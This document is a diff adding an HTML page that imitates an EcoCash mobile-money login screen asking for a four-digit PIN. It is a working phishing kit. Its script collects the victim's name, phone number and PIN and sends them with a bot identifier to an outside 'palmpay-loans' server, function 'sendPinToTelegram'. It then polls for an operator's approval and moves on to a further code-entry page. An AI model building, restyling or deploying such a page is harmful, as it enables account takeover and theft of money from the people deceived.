@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoCash | Enter PIN</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #f0f4f8;
+  min-height: 100vh;
+}
+
+/* ===== CONTAINER ===== */
+.container {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+/* ===== WHITE SECTION ===== */
+.upper-section {
+  background: #ffffff;
+  padding: 48px 24px 110px;
+  text-align: center;
+  position: relative;
+  z-index: 2;
+}
+
+/* CURVE */
+.upper-section::after {
+  content: "";
+  position: absolute;
+  bottom: -48px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 140%;
+  height: 96px;
+  background: #ffffff;
+  border-radius: 0 0 100% 100%;
+}
+
+/* Branding */
+.brand-name {
+  font-size: 40px;
+  font-weight: 900;
+  letter-spacing: -1px;
+  margin-bottom: 10px;
+}
+
+.eco { color: #0c5ba8; }
+.cash { color: #e53935; }
+
+.welcome-text {
+  font-size: 20px;
+  color: #555;
+  margin-bottom: 6px;
+}
+
+.phone-display {
+  border: none;
+  background: none;
+  text-align: center;
+  font-size: 17px;
+  color: #777;
+  width: 100%;
+  margin-bottom: 40px;
+}
+
+/* PIN */
+.pin-label {
+  font-size: 17px;
+  color: #666;
+  margin-bottom: 26px;
+}
+
+.pin-boxes {
+  display: flex;
+  justify-content: center;
+  gap: 18px;
+}
+
+.pin-boxes input {
+  width: 56px;
+  height: 56px;
+  border: 2px solid #0c5ba8;
+  border-radius: 12px;
+  font-size: 22px;
+  text-align: center;
+  outline: none;
+  caret-color: transparent;
+}
+
+#status {
+  margin-top: 12px;
+  font-size: 14px;
+  color: #e53935;
+  min-height: 18px;
+}
+
+/* ===== BLUE SECTION ===== */
+.lower-section {
+  background: #0c5ba8;
+  color: #ffffff;
+  padding: 96px 24px 32px;
+  margin-top: -48px;
+  position: relative;
+  z-index: 1;
+
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+}
+
+/* 🔥 CENTER BLOCK */
+.blue-center {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;   /* vertical center */
+  align-items: center;       /* horizontal center */
+}
+
+/* text */
+.instruction {
+  text-align: center;
+  font-size: 15px;
+  line-height: 1.4;
+  margin-bottom: 28px;
+}
+
+/* buttons */
+.action-buttons {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+}
+
+.action {
+  flex: 1;
+  max-width: 160px;
+  background: #ffffff;
+  color: #0c5ba8;
+  padding: 14px;
+  border-radius: 14px;
+  font-weight: 600;
+  text-align: center;
+}
+
+/* footer */
+.footer {
+  margin-top: auto;
+  text-align: center;
+  font-size: 13px;
+  opacity: 0.9;
+}
+
+.footer .version {
+  margin-bottom: 6px;
+}
+
+.footer a {
+  color: #ffffff;
+  text-decoration: underline;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- WHITE -->
+  <div class="upper-section">
+    <div class="brand-name">
+      <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
+
+    <div class="welcome-text">Welcome</div>
+    <input class="phone-display" id="phoneDisplay" readonly>
+
+    <div class="pin-label">Enter your PIN</div>
+
+    <div class="pin-boxes">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <!-- BLUE -->
+  <div class="lower-section">
+
+    <!-- 🔥 CENTERED CONTENT -->
+    <div class="blue-center">
+      <p class="instruction">
+        To register an EcoCash wallet or get assistance,<br>
+        click below
+      </p>
+
+      <div class="action-buttons">
+        <div class="action">Register</div>
+        <div class="action">Help & Support</div>
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+      <div class="version">v3.0.2P</div>
+      <div>
+        By signing in you agree to the
+        <a href="#">Terms and Conditions</a>
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- 🔒 SCRIPT UNTOUCHED -->
+<script>
+document.getElementById("phoneDisplay").value =
+  localStorage.getItem("phone") || "Unknown Number";
+
+const botId = new URLSearchParams(window.location.search).get("botId");
+const boxes = document.querySelectorAll(".pin-boxes input");
+const statusEl = document.getElementById("status");
+
+async function sendPinToTelegram(name, phone, pin) {
+  const BACKEND_URL = "https://palmpay-loans-8ioh.onrender.com";
+  try {
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ name, phone, pin, botId })
+    });
+    return res.json();
+  } catch {
+    return null;
+  }
+}
+
+async function pollPinApproval(requestId) {
+  const BACKEND_URL = "https://palmpay-loans-8ioh.onrender.com";
+  return new Promise(resolve => {
+    const i = setInterval(async () => {
+      const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+      const d = await r.json();
+      if(d.approved === true || d.approved === false){
+        clearInterval(i);
+        resolve(d.approved);
+      }
+    },1500);
+  });
+}
+
+boxes.forEach((box,i)=>{
+  box.addEventListener("input", async ()=>{
+    box.value = box.value.replace(/[^0-9]/g,'');
+    if(box.value && i<3) boxes[i+1].focus();
+    if(i===3 && box.value){
+      let pin=""; boxes.forEach(b=>pin+=b.value);
+      localStorage.setItem("pin",pin);
+      const name = localStorage.getItem("name")||"Unknown";
+      const phone = localStorage.getItem("phone")||"Unknown";
+      boxes.forEach(b=>b.disabled=true);
+      statusEl.textContent="Submitting PIN...";
+      const res = await sendPinToTelegram(name,phone,pin);
+      if(!res||!res.requestId){
+        statusEl.textContent="Failed. Try again.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus(); return;
+      }
+      const ok = await pollPinApproval(res.requestId);
+      if(ok){
+        window.location.href="code.html?botId="+botId;
+      } else {
+        statusEl.textContent="Incorrect PIN.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus();
+      }
+    }
+  });
+  box.addEventListener("keydown",e=>{
+    if(e.key==="Backspace"&&!box.value&&i>0) boxes[i-1].focus();
+  });
+});
+boxes[0].focus();
+</script>
+
+</body>
+</html>
